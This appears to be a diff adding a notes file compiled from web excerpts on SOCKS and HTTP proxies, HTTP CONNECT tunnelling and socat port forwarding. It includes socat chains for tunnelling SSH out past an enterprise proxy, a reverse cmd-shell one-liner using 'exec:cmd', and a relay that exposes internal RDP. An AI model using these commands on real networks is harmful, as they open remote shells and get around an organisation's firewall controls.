@@ -1,0 +1,71 @@
+http://www.jguru.com/faq/view.jsp?EID=227532
+
+A SOCKS server is a general purpose proxy server that establishes a TCP connection to another server on behalf of a client, then routes all the traffic back and forth between the client and the server. It works for any kind of network protocol on any port. SOCKS Version 5 adds additional support for security and UDP. The SOCKS server does not interpret the network traffic between client and server in any way, and is often used because clients are behind a firewall and are not permitted to establish TCP connections to servers outside the firewall unless they do it through the SOCKS server. Most web browsers for example can be configured to talk to a web server via a SOCKS server. Because the client must first make a connection to the SOCKS server and tell it the host it wants to connect to, the client must be "SOCKS enabled." On Windows, it is possible to "shim" the TCP stack so that all client software is SOCKS enabled. A free SOCKS shim is available from Hummingbird at http://www.hummingbird.com/products/nc/socks/index.html.
+
+An HTTP proxy is similar, and may be used for the same purpose when clients are behind a firewall and are prevented from making outgoing TCP connections to servers outside the firewall. However, unlike the SOCKS server, an HTTP proxy does understand and interpret the network traffic that passes between the client and downstream server, namely the HTTP protocol. Because of this the HTTP proxy can ONLY be used to handle HTTP traffic, but it can be very smart about how it does it. In particular, it can recognize often repeated requests and cache the replies to improve performance. Many ISPs use HTTP proxies regardless of how the browser is configured because they simply route all traffic on port 80 through the proxy server.
+
+https://stackoverflow.com/questions/12026247/what-is-the-difference-between-an-http-proxy-and-a-socks-proxy
+
+HTTP proxy is able to support high level protocols other than HTTP if it supports CONNECT method, which is primarily used for HTTPS connections, here is description from Squid wiki:
+
+The CONNECT method is a way to tunnel any kind of connection through an HTTP proxy. By default, the proxy establishes a TCP connection to the specified server, responds with an HTTP 200 (Connection Established) response, and then shovels packets back and forth between the client and the server, without understanding or interpreting the tunnelled traffic.
+
+If client software supports connection through 'HTTP CONNECT'-enabled (HTTPS) proxy it can be any high level protocol that can work with such a proxy (VPN, SSH, SQL, version control, etc.)
+
+
+http://wiki.yobi.be/wiki/Bypass_Proxy
+socat TCP4-LISTEN:1234 OPENSSL:my.server:443,verify=0 &
+socat TCP4-LISTEN:4321 PROXY:127.0.0.1:another.server:22,proxyport=1234 &
+ssh -p 4321 127.0.0.1
+
+socat TCP4-LISTEN:2222,bind=127.0.0.1 OPENSSL:my.server:443,verify=0 &
+socat TCP4-LISTEN:1111,bind=127.0.0.1 PROXY:127.0.0.1:another.server:22,proxyport=2222,proxyauth=user:pass &
+ssh -p 1111 127.0.0.1
+
+go through an enterprise proxy
+socat TCP4-LISTEN:3333,bind=127.0.0.1 PROXY:big.brother.proxy:my.server:443,proxyport=8080 &
+socat TCP4-LISTEN:2222,bind=127.0.0.1 OPENSSL:127.0.0.1:3333,verify=0 &
+socat TCP4-LISTEN:1111,bind=127.0.0.1 PROXY:127.0.0.1:another.server:22,proxyport=2222,proxyauth=user:pass &
+ssh -p 1111 127.0.0.1
+
+https://stackoverflow.com/questions/9596594/why-is-fork-needed-by-socat-when-connecting-to-a-web-server
+With fork
+I wanted to put a software intermediary between the browser and the web server, and so began experimenting with socat. The following works just fine:
+
+socat TCP-LISTEN:8080,fork TCP:localhost:3000
+I can browse to localhost:8080 and things work as expected. However, if I omit the ",fork" argument like so,
+
+socat TCP-LISTEN:8080 TCP:localhost:3000
+the local rails web site is quite broken looking in the browser.
+
+socat TCP-LISTEN:80,reuseaddr,fork,su=nobody TCP:www.bytesandbones.com:80
+
+
+http://www.cnblogs.com/shangdawei/p/3843039.html
+
+1、socat是支持cmdshell反连的，这点最重要的我在google和百度了一堆都没找到，自己研究了半天出来了。
+
+   server:socat readline udp-listen:port  -------socat支持udp、tcp、https等，我测试了tcp和udp
+
+   client:socat udp:serverip:port exec:cmd,pty,stderr
+   
+   
+
+2、端口转发功能：上文写的是错误的，根本无法实现。大家测试过就知道了。
+
+   正确的应该如下：
+
+   外部：socat tcp-listen:11161,reuseaddr,fork tcp-listen:9833
+
+   内部：socat tcp:外部ip:11161,reuseaddr,fork tcp:127.0.0.1:3389
+
+不加reuseaddr,fork是无法成功连接的，具体原因大家可以再百度下，有详细介绍。
+
+https://trent.utfs.org/wiki/Proxy
+Socat
+Socat can not act[2] as a proxy, but only talk to a proxy server. For example, a SOCKS proxy:
+ssh -NC -D 127.0.0.1:8080 bob@remote.domain.com
+This will open a SOCKS4/SOCKS5 proxy on :8080 where a browser can connect to. Also, socat can talk to this proxy, but it cannot know the destination to connect to. In this example we're using dest.example.com:
+
+socat TCP-LISTEN:1234,fork SOCKS4:127.0.0.1:dest.example.com:80,socksport=8080
+Now a browser can connect to :1234 (socat) which will in turn connect to :8080 (ssh) which will in turn direct traffic to remote.domain.com to fetch content from dest.example.com.
